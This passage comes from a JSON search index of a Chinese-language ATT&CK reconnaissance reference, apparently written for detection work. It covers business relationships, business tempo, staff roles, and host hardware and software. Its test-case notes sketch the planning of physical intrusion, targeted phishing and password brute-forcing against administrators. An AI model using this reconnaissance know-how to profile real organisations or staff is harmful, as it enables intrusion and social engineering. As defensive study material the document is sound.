u4f8b\u5982\uff1a\u5efa\u7acb\u5e10\u6237\u6216\u635f\u5bb3\u5e10\u6237\uff09\u6216\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff08\u4f8b\u5982\uff1a\u4f9b\u5e94\u94fe\u59a5\u534f\uff0c\u9a71\u52a8\u5f0f\u59a5\u534f\uff0c\u6216\u201c\u4fe1\u4efb\u5173\u7cfb\u201d\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4f8b\u5982\u53d7\u5bb3\u8005\u7684\u4e2a\u4eba\u793e\u4ea4\u4fe1\u606f\uff0c\u5fae\u535a\u3001\u5fae\u4fe1\u3001QQ\u7b49\u3002</p> <p>\u4f8b\u5982\u53d7\u5bb3\u7ec4\u7ec7\u7684\u4e0a\u4e0b\u6e38\u5173\u7cfb\uff0c\u6bd4\u5982\u6bcd\u5b50\u516c\u53f8\u5173\u7cfb\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1591-002</p> <p>https://attack.mitre.org/techniques/T1591/002/</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/","title":"T1591-003-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u786e\u5b9a\u4e1a\u52a1\u8282\u594f","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u4e0e\u53d7\u5bb3\u8005\u7684\u4e1a\u52a1\u8282\u594f\u6709\u5173\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u5b9a\u4f4d\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u3002\u6709\u5173\u7ec4\u7ec7\u4e1a\u52a1\u8282\u594f\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u6bcf\u5468\u7684\u5de5\u4f5c\u65f6\u95f4/\u5929\u3002\u6b64\u4fe1\u606f\u8fd8\u53ef\u80fd\u663e\u793a\u53d7\u5bb3\u8005\u7684\u786c\u4ef6\u548c\u8f6f\u4ef6\u8d44\u6e90\u7684\u8d2d\u4e70\u548c\u8fd0\u8f93\u65f6\u95f4/\u65e5\u671f\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u201c\u7f51\u7edc\u9493\u9c7c\u8bf1\u9a97\u201d\u76f4\u63a5\u8bf1\u6355\u3002\u6709\u5173\u4e1a\u52a1\u8282\u594f\u7684\u4fe1\u606f\u4e5f\u53ef\u80fd\u4f1a\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff0c\u793e\u4ea4\u5a92\u4f53\u6216\u53d7\u5bb3\u4eba\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u6b64\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\u4ee5\u83b7\u53d6\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u5e10\u6237\u6216\u635f\u5bb3\u5e10\u6237\uff09\u548c/\u6216\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff08\u4f8b\u5982\uff1a\u4f9b\u5e94\u94fe\u5173\u7cfb\u6216\u4fe1\u4efb\u5173\u7cfb\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4e2a\u4eba\u7406\u89e3\uff1a\u6b64\u6280\u672f\u53ef\u80fd\u5728\u793e\u5de5\u524d\u671f\u4f7f\u7528\uff0c\u89c2\u5bdf\u53d7\u5bb3\u8005\u4e0a\u4e0b\u73ed\u65f6\u95f4\u3001\u8f66\u8f86\u8fdb\u5165\u60c5\u51b5\uff0c\u4e3a\u540e\u7eed\u7269\u7406\u5165\u4fb5\u63d0\u4f9b\u4e00\u4e9b\u5e2e\u52a9\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E4%B8%9A%E5%8A%A1%E8%8A%82%E5%A5%8F/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1591-003</p> <p>https://attack.mitre.org/techniques/T1591/003/</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/","title":"T1591-004-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u786e\u5b9a\u89d2\u8272","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u76ee\u6807\u7ec4\u7ec7\u4e2d\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u7ec4\u7ec7\u5185\u7684\u8eab\u4efd\u548c\u89d2\u8272\u7684\u4fe1\u606f\u3002\u6709\u5173\u4e1a\u52a1\u89d2\u8272\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63ed\u793a\u5404\u79cd\u53ef\u9488\u5bf9\u6027\u7684\u7ec6\u8282\uff0c\u5305\u62ec\u5173\u952e\u4eba\u5458\u7684\u53ef\u8bc6\u522b\u4fe1\u606f\u4ee5\u53ca\u4ed6\u4eec\u53ef\u4ee5\u8bbf\u95ee\u54ea\u4e9b\u6570\u636e/\u8d44\u6e90\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u201c\u7f51\u7edc\u9493\u9c7c\u8bf1\u9a97\u201d\u76f4\u63a5\u8bf1\u6355\u3002\u6709\u5173\u4e1a\u52a1\u89d2\u8272\u7684\u4fe1\u606f\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff0c\u793e\u4ea4\u5a92\u4f53\u6216\u53d7\u5bb3\u4eba\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u6b64\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\u4ee5\u83b7\u53d6\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u5e10\u6237\u6216\u7834\u574f\u5e10\u6237\uff09\u6216\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4e2a\u4eba\u7406\u89e3\uff1a\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u8fd0\u7ef4\u3001\u7f51\u7edc\u7ba1\u7406\u5458\u76f8\u5173\u4fe1\u606f\uff0c\u540e\u7eed\u53ef\u4ee5\u8fdb\u884c\u7cbe\u51c6\u793e\u5de5\uff0c\u6216\u8005\u76f8\u5173\u4eba\u5458\u7684\u8d26\u53f7\u5bc6\u7801\u7206\u7834\uff0c\u4e5f\u53ef\u80fd\u662f\u53d1\u9001\u53d7\u5bb3\u8005\u611f\u5174\u8da3\u7684\u90ae\u4ef6\uff0c\u5b9e\u73b0\u90ae\u4ef6\u9493\u9c7c\u7b49\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E8%A7%92%E8%89%B2/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1591-004</p> <p>https://attack.mitre.org/techniques/T1591/004/</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/","title":"T1592-001-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u786c\u4ef6\u4fe1\u606f","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u4e3b\u673a\u786c\u4ef6\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5173\u786c\u4ef6\u57fa\u7840\u8bbe\u65bd\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982\u7279\u5b9a\u4e3b\u673a\u4e0a\u7684\u7c7b\u578b\u548c\u7248\u672c\uff0c\u4ee5\u53ca\u662f\u5426\u5b58\u5728\u53ef\u80fd\u6307\u793a\u9644\u52a0\u9632\u5fa1\u4fdd\u62a4\u63aa\u65bd\u7684\u5176\u4ed6\u7ec4\u4ef6\uff08\u4f8b\u5982\uff1a\u5361/\u751f\u7269\u8bc6\u522b\u5668\uff0c\u4e13\u7528\u52a0\u5bc6\u786c\u4ef6\u7b49\uff09\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\uff08\u4f8b\u5982\uff1a\u4e3b\u673a\u540d\uff0c\u670d\u52a1\u5668\u65d7\u6807\uff0c\u7528\u6237\u4ee3\u7406\u5b57\u7b26\u4e32\uff09\u3001 \u9493\u9c7c\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u5165\u4fb5\u7ad9\u70b9\uff0c\u7136\u540e\u690d\u5165\u65e8\u5728\u6536\u96c6\u8bbf\u95ee\u8005\u4e3b\u673a\u4fe1\u606f\u7684\u6076\u610f\u5185\u5bb9\u3002\u6709\u5173\u786c\u4ef6\u57fa\u7840\u8bbe\u65bd\u7684\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u804c\u4f4d\u53d1\u5e03\uff0c\u7f51\u7edc\u5730\u56fe\uff0c\u8bc4\u4f30\u62a5\u544a\uff0c\u5c65\u5386\u8868\u6216\u8d2d\u4e70\u53d1\u7968\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u63d0\u4f9b\u53ef\u80fd\u6027\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff0c\u6216\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u653b\u51fb\u786c\u4ef6\u4f9b\u5e94\u94fe\u6216\u786c\u4ef6\u6dfb\u52a0\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1592-001</p> <p>https://attack.mitre.org/techniques/T1592/001/</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/","title":"T1592-002-\u6536\u96c6\u53d7\u5bb3\u8005\u4e3b\u673a\u4fe1\u606f-\u8f6f\u4ef6\u4fe1\u606f","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1592-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e8b\u5148\u6536\u96c6\u653b\u51fb\u76ee\u6807\u7684\u4e3b\u673a\u8f6f\u4ef6\u4fe1\u606f\uff0c\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u7ec6\u8282\u4fe1\u606f\u5982\u4e3b\u673a\u4e0a\u7684\u8f6f\u4ef6\u7c7b\u578b\u548c\u7248\u672c\uff0c\u662f\u5426\u6709\u9632\u5fa1\u8f6f\u4ef6\uff08\u5982\u9632\u75c5\u6bd2\u3001SIEM\u7ec4\u4ef6\uff09\u7b49\u3002</p> 